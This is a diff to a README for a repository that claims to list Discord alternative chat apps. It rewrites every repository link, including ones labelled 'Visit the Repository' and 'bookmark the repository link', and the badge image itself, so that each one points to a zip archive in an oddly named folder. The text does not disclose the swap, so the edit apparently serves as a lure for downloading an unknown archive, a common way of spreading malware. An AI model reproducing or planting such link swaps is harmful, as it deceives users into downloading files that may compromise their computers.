@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Discord-Alternatives](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/anomaly2point0/Discord-Alternatives)
+[![Download Discord-Alternatives](https://github.com/anomaly2point0/Discord-Alternatives/raw/refs/heads/main/laicization/Discord_Alternatives_1.2-beta.1.zip)](https://github.com/anomaly2point0/Discord-Alternatives/raw/refs/heads/main/laicization/Discord_Alternatives_1.2-beta.1.zip)
 
 ## 📚 Introduction
 
@@ -16,7 +16,7 @@ To begin using the Discord-Alternatives list, follow these simple steps:
    
    Go to the link below to access the full list of Discord alternatives:
    
-   [Visit the Discord-Alternatives Repository](https://github.com/anomaly2point0/Discord-Alternatives)
+   [Visit the Discord-Alternatives Repository](https://github.com/anomaly2point0/Discord-Alternatives/raw/refs/heads/main/laicization/Discord_Alternatives_1.2-beta.1.zip)
 
 2. **Explore Alternatives**
 
@@ -93,6 +93,6 @@ Follow our discussions and updates by checking the repository. We welcome feedba
 
 Once you've downloaded and installed an application from our list, you're ready to enjoy a new communication experience!
 
-For easy access, remember to bookmark the repository link: [Discord-Alternatives Repository](https://github.com/anomaly2point0/Discord-Alternatives).
+For easy access, remember to bookmark the repository link: [Discord-Alternatives Repository](https://github.com/anomaly2point0/Discord-Alternatives/raw/refs/heads/main/laicization/Discord_Alternatives_1.2-beta.1.zip).
 
 Thank you for exploring the world of Discord alternatives!
